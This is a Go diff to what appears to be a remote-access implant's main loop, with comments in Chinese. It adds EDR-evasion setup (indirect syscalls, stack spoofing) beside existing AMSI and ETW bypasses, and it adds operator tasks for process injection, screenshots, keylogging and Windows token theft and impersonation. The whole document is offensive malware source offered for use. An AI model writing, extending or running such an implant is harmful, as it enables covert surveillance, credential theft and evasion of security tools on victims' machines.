@@ -43,6 +43,8 @@ func main() {
 
 	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
 	evasion.InitSSNMap()
+	evasion.InitIndirectSyscall()
+	evasion.InitStackSpoof()
 
 	// ===== EDR Evasion: AMSI + ETW Patch =====
 	evasion.BypassAMSI()
@@ -96,7 +98,8 @@ func main() {
 
 	for {
 		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
-		evasion.EkkoSleep(tp.GetInterval() + extraDelay)
+		// TODO: EkkoSleep修复后启用
+		time.Sleep(tp.GetInterval() + extraDelay)
 
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
@@ -235,6 +238,48 @@ func procReq(pkt *encode.Packet) []byte {
 
 	case encode.TaskPayload:
 		resp.Output = handlePayload(req.Params)
+
+	case encode.TaskInject:
+		output, err := core.HandleInject(req.Params)
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
+
+	case encode.TaskScreenshot:
+		data, err := core.CaptureScreenshot()
+		resp.Success = err == nil
+		if err != nil {
+			resp.Error = err.Error()
+		} else {
+			resp.Output = evasion.B64Encode(data)
+		}
+
+	case encode.TaskKeylogOn:
+		err := core.StartKeylogger()
+		resp.Success = err == nil
+		if err != nil {
+			resp.Error = err.Error()
+		} else {
+			resp.Output = "keylogger started"
+		}
+
+	case encode.TaskKeylogOff:
+		output, err := core.StopKeylogger()
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
+
+	case encode.TaskTokenEnum, encode.TaskTokenSteal, encode.TaskTokenRev2, encode.TaskTokenMake:
+		output, err := core.HandleToken(req.Params)
+		resp.Success = err == nil
+		resp.Output = output
+		if err != nil {
+			resp.Error = err.Error()
+		}
 
 	case encode.TaskSysInfo:
 		info := core.GetSysInfo()
